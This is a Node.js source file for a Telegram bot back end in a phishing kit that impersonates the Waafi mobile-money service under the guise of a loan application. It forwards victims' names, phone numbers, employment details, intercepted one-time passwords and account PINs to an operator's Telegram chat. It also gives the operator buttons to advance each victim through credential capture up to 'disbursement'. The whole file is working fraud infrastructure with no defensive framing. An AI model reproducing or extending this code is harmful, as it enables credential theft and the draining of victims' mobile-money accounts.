const express = require('express');
const app = express();
const axios = require('axios');

app.use(express.json());

// Set your valid Telegram credentials here
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
const SERVER_CORE_URL = 'http://localhost:3000';

// =========================================================================
// ROUTING INCOMING SOCKET EVENTS FROM SERVER.JS TO TELEGRAM CHANNELS
// =========================================================================

// Sends user data summary (Triggered exactly ONCE when Step 3 finishes)
app.post('/trigger-step3-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`━━━━━━━━━━━━━━━━━━━━━━━━
🏦 <b>Waafi - Step 3: Income & Employment</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Loan Type:</b> ${session.loanType}
• <b>Amount:</b> $${Number(session.amount).toLocaleString()}
• <b>Term:</b> ${session.term} Bilood
• <b>Purpose:</b> ${session.purpose}

• <b>Full Name:</b> ${session.firstName} ${session.lastName}
• <b>Email:</b> ${session.email}
• <b>Phone:</b> +252${session.phone}

• <b>Employment:</b> ${session.employment}
• <b>Income:</b> $${Number(session.income).toLocaleString()}
• <b>Employer:</b> ${session.employer || 'N/A'}
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "✅ APPROVE DATA -> GO OTP", callback_data: `approve_data:${session.appId}` },
            { text: "❌ REJECT APPLICATION", callback_data: `reject_app:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

// Sends OTP token panel (Waits for user input to prevent early double triggers)
app.post('/trigger-step4-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`━━━━━━━━━━━━━━━━━━━━━━━━
🔑 <b>Waafi - Step 4: Intercepted OTP Token</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Phone Linked:</b> +252${session.phone}
• <b>Intercepted OTP:</b> <code>${session.otpToken}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "✅ CONFIRM OTP -> GO PIN", callback_data: `approve_otp:${session.appId}` },
            { text: "❌ REJECT OTP", callback_data: `reject_otp:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

// Sends the account secure access PIN prompt
app.post('/trigger-step5-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`━━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Waafi - Step 5: Intercepted Account PIN</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Phone Linked:</b> +252${session.phone}
• <b>Account PIN:</b> <code>${session.pinCode}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "✅ APPROVE PIN & DISBURSE", callback_data: `approve_pin:${session.appId}` },
            { text: "❌ REJECT PIN", callback_data: `reject_pin:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

// =========================================================================
// TELEGRAM INLINE WEBHOOK CALLS HANDLER
// =========================================================================
app.post('/telegram-webhook', async (req, res) => {
    res.sendStatus(200);
    
    const { callback_query } = req.body;
    if (!callback_query || !callback_query.data) return;

    const [actionSignal, targetAppId] = callback_query.data.split(':');
    let logMessage = '';
    let apiRouteSignal = actionSignal;

    // Map inline clicks cleanly to the destination API actions
    if (actionSignal === 'approve_data') {
        logMessage = "✅ Summary Verified. Client prompted to provide active verification OTP.";
    } else if (actionSignal === 'reject_app') {
        logMessage = "❌ Profile Application rejected completely by supervisor.";
    } else if (actionSignal === 'approve_otp') {
        logMessage = "✅ OTP verified and acknowledged as accurate.";
    } else if (actionSignal === 'reject_otp') {
        apiRouteSignal = 'otp-failed';
        logMessage = "❌ Provided OTP flagged as invalid. Re-auth loop triggered.";
    } else if (actionSignal === 'approve_pin') {
        logMessage = "💰 SUCCESS! Transaction PIN approved. Disbursed reference code logged.";
    } else if (actionSignal === 'reject_pin') {
        apiRouteSignal = 'pin-failed';
        logMessage = "❌ Account Secure PIN transaction attempt rejected.";
    }

    // Forward the action to server.js instantly via internal POST loop
    try {
        const response = await axios.post(`${SERVER_CORE_URL}/api/admin-action`, {
            actionSignal: apiRouteSignal,
            targetAppId: targetAppId
        });

        if (response.data.success) {
            updateTelegramMessageUI(callback_query.message, logMessage);
        }
    } catch (err) {
        // Fallback alert if user closed their browser tab mid-flight
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: "⚠️ Failed to forward action: Active user session closed or missing.",
                show_alert: true
            });
        } catch (e) {}
    }
});

// Global clean transmission runner
async function sendToTelegram(text, replyMarkup) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'HTML',
            reply_markup: replyMarkup
        });
    } catch (e) { console.error("Error writing message data stream to Telegram API:", e.message); }
}

// Cleans up active inline buttons to stop duplicate selections
async function updateTelegramMessageUI(msgObj, statusText) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
            chat_id: TELEGRAM_CHAT_ID,
            message_id: msgObj.message_id,
            text: `${msgObj.text}\n\n🤖 <b>Status update log:</b>\n<i>${statusText}</i>`,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {}
}

app.listen(3001, () => {
    console.log('Telegram Bot Manager service running on port 3001');
});